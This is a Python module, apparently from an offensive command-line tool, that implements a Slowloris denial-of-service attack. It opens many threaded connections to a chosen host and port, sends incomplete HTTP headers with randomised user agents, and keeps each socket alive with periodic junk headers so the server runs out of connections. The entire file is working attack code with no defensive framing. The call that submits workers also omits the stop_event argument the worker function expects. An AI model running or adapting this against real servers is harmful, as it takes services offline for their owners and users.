import random
import socket
import threading

import time
import typer

from attackcli.utils.thread_exec import ThreadedExecutor
from utils.useragent import get_random_user_agent


def _send_slowloris_request(target: str, port: int, timeout: float, stop_event: threading.Event):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    s.connect((target, port))
    try:

        s.send(f"GET /?{random.randint(0, 10000)} HTTP/1.1\r\n".encode("utf-8"))
        s.send(f"Host: {target}\r\n".encode("utf-8"))
        s.send(f"User-Agent: {get_random_user_agent()}\r\n".encode("utf-8"))
        s.send("Accept-Language: en-US,en;q=0.5\r\n".encode("utf-8"))
        s.send("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n".encode("utf-8"))
        s.send("Connection: keep-alive\r\n".encode("utf-8"))

        while not stop_event.is_set():
            time.sleep(15)
            typer.echo(typer.style(f"Sending packet {target}:{port}", fg=typer.colors.BRIGHT_BLACK))
            s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"))
    except socket.error as e:
        typer.echo(typer.style(f"Socket error: {e}", fg=typer.colors.RED))
    except Exception as e:
        typer.echo(typer.style(f"Error: {e}", fg=typer.colors.RED))
    finally:
        s.close()


def slowloris_attack(target: str, port: int, timeout: float, workers: int):
    typer.echo(typer.style("[!] To stop Press CTRL+C to stop it.", fg=typer.colors.WHITE, bold=True))
    executor = ThreadedExecutor(max_workers=workers)
    executor.start()

    try:
        for _ in range(workers):
            executor.submit(_send_slowloris_request, target, port, timeout)
        while True:
            time.sleep(1)  # Keep the main thread alive
    except KeyboardInterrupt:
        executor.wait()
